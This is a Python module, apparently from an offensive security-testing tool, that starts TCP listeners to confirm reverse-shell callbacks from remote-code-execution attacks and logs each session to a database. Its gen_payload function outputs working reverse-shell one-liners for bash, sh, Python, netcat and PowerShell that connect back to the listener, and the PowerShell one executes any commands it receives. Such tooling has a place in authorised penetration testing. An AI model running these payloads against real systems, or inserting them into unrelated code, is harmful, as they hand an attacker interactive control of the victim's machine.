"""
Reverse-shell listener service.

When an RCE attack payload includes a reverse-shell one-liner
(``bash -i >& /dev/tcp/HOST/PORT 0>&1`` etc), the target will attempt
to open a TCP connection back to us. This module spins up a listener
per attack, records the incoming connection + any data captured, and
closes the socket cleanly after a short capture window.

Public API:

    listener = reverse_shell.mint(
        attack_id="rce",
        bind_host="0.0.0.0",          # usually 0.0.0.0 so targets can reach it
        advertise_host="203.0.113.5", # what to put in the payload
        ttl=120,
    )
    # attacker payload uses listener.advertise_host / listener.port
    session = reverse_shell.wait(listener.token, timeout=30)
    if session and session["connected"]:
        # confirmed — see session["remote_ip"], session["captured"]

All sessions are persisted via ``ReverseShellSession`` for audit trails.

Safety:
  - Default capture window is short (60s).
  - Writes to the socket are NOT supported — this is a passive
    confirmation channel, not a real interactive shell.
  - Bind ports drawn from a configurable pool (default 40000-45000).
"""

from __future__ import annotations

import os
import random
import socket
import threading
import time
import uuid
from dataclasses import dataclass
from datetime import datetime, timedelta


_PORT_POOL_START = int(os.environ.get("MINERVA_RS_PORT_MIN", "40000"))
_PORT_POOL_END = int(os.environ.get("MINERVA_RS_PORT_MAX", "45000"))
_DEFAULT_BIND = os.environ.get("MINERVA_RS_BIND", "0.0.0.0")
_DEFAULT_ADVERTISE = (
    os.environ.get("MINERVA_RS_ADVERTISE")
    or os.environ.get("MINERVA_OOB_URL", "").replace("http://", "")
                                              .replace("https://", "")
                                              .split(":")[0]
    or "host.docker.internal"
)
_CAPTURE_WINDOW_SEC = 60
_CAPTURE_MAX_BYTES = 16384


@dataclass
class Listener:
    token: str
    host: str              # what the payload should connect to
    bind_host: str
    port: int
    created_at: float
    expires_at: float
    attack_id: str | None = None


_active: dict[str, "_ListenerState"] = {}
_active_lock = threading.Lock()


class _ListenerState:
    def __init__(self, sock: socket.socket, listener: Listener):
        self.sock = sock
        self.listener = listener
        self.event = threading.Event()
        self.session_info: dict | None = None
        self.thread = threading.Thread(target=self._accept_loop, daemon=True)

    def _accept_loop(self):
        s = self.sock
        s.settimeout(max(1.0, self.listener.expires_at - time.time()))
        try:
            conn, addr = s.accept()
        except (socket.timeout, OSError):
            return
        remote_ip, remote_port = addr[0], addr[1]
        captured = bytearray()
        deadline = time.time() + _CAPTURE_WINDOW_SEC
        conn.settimeout(2.0)
        try:
            while time.time() < deadline and len(captured) < _CAPTURE_MAX_BYTES:
                try:
                    chunk = conn.recv(1024)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                captured.extend(chunk)
        finally:
            try:
                conn.close()
            except Exception:
                pass
        self.session_info = {
            "connected": True,
            "remote_ip": remote_ip,
            "remote_port": remote_port,
            "bytes": len(captured),
            "captured_preview": bytes(captured[:4096]).decode(
                "utf-8", errors="replace"),
        }
        self.event.set()
        self._persist()

    def _persist(self):
        # Best-effort DB save; don't let errors escape the listener thread
        try:
            from app import create_app, db
            from app.models import ReverseShellSession
            app = create_app("development") if False else None  # noop guard
            from flask import has_app_context
            if has_app_context():
                self._write(db, ReverseShellSession)
            else:
                # Build a minimal context for the write
                from app import create_app as _ca
                app = _ca(os.environ.get("FLASK_ENV", "development"))
                with app.app_context():
                    self._write(db, ReverseShellSession)
        except Exception:
            pass

    def _write(self, db, Model):
        row = Model.query.get(self.listener.token)
        info = self.session_info or {}
        if row is None:
            row = Model(
                token=self.listener.token,
                attack_id=self.listener.attack_id,
                host=self.listener.host,
                port=self.listener.port,
                created_at=datetime.utcfromtimestamp(self.listener.created_at),
                expires_at=datetime.utcfromtimestamp(self.listener.expires_at),
            )
            db.session.add(row)
        row.closed_at = datetime.utcnow()
        row.remote_ip = info.get("remote_ip")
        row.remote_port = info.get("remote_port")
        row.captured_bytes = info.get("bytes") or 0
        row.captured_preview = info.get("captured_preview")
        db.session.commit()


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def mint(attack_id: str | None = None, *, ttl: int = 120,
         bind_host: str | None = None,
         advertise_host: str | None = None) -> Listener:
    """Reserve a port + start a listener thread. Returns a Listener."""
    bind = bind_host or _DEFAULT_BIND
    advertise = advertise_host or _DEFAULT_ADVERTISE

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    port = None
    last_err = None
    # Try up to 40 ports
    for _ in range(40):
        p = random.randint(_PORT_POOL_START, _PORT_POOL_END)
        try:
            sock.bind((bind, p))
            port = p
            break
        except OSError as e:
            last_err = e
            continue
    if port is None:
        sock.close()
        raise RuntimeError(f"No free port in range "
                           f"{_PORT_POOL_START}-{_PORT_POOL_END}: {last_err}")
    sock.listen(1)
    token = uuid.uuid4().hex
    now = time.time()
    listener = Listener(
        token=token,
        host=advertise,
        bind_host=bind,
        port=port,
        created_at=now,
        expires_at=now + max(10, ttl),
        attack_id=attack_id,
    )
    state = _ListenerState(sock, listener)
    with _active_lock:
        _active[token] = state
    # Pre-register a DB row so admins can see it even if nothing connects
    try:
        from app import db
        from app.models import ReverseShellSession
        db.session.add(ReverseShellSession(
            token=token, attack_id=attack_id, host=advertise,
            port=port,
            created_at=datetime.utcfromtimestamp(now),
            expires_at=datetime.utcfromtimestamp(listener.expires_at),
        ))
        db.session.commit()
    except Exception:
        try:
            db.session.rollback()
        except Exception:
            pass
    state.thread.start()
    return listener


def wait(token: str, *, timeout: float = 30.0) -> dict | None:
    with _active_lock:
        state = _active.get(token)
    if not state:
        return None
    if state.session_info:
        return dict(state.session_info)
    got = state.event.wait(timeout=max(0.1, timeout))
    return dict(state.session_info) if got and state.session_info else None


def release(token: str) -> None:
    with _active_lock:
        state = _active.pop(token, None)
    if not state:
        return
    try:
        state.sock.close()
    except Exception:
        pass
    try:
        state.event.set()
    except Exception:
        pass


def status(token: str) -> dict | None:
    with _active_lock:
        state = _active.get(token)
    if not state:
        return None
    return {
        "token": token,
        "host": state.listener.host,
        "port": state.listener.port,
        "expires_at": state.listener.expires_at,
        "connected": bool(state.session_info),
        "session": state.session_info,
    }


def gen_payload(listener: Listener, flavor: str = "bash") -> str:
    """Canonical reverse-shell one-liners pointing at ``listener``."""
    h, p = listener.host, listener.port
    if flavor == "bash":
        return f"bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'"
    if flavor == "sh":
        return f"sh -c 'exec 5<>/dev/tcp/{h}/{p}; cat <&5 | sh -i 2>&5 >&5'"
    if flavor == "python":
        return (
            "python3 -c \"import socket,os,pty;"
            f"s=socket.socket();s.connect(('{h}',{p}));"
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            "pty.spawn('/bin/bash')\""
        )
    if flavor == "nc":
        return f"nc -e /bin/sh {h} {p}"
    if flavor == "powershell":
        return (
            "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient("
            f"'{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            "$d=(New-Object -TypeName System.Text.ASCIIEncoding)"
            ".GetString($b,0,$i);"
            "$r=(iex $d 2>&1 | Out-String);"
            "$sb=([text.encoding]::ASCII).GetBytes($r);"
            "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""
        )
    raise ValueError(f"unknown flavor: {flavor}")


__all__ = [
    "Listener", "mint", "wait", "release", "status", "gen_payload",
]
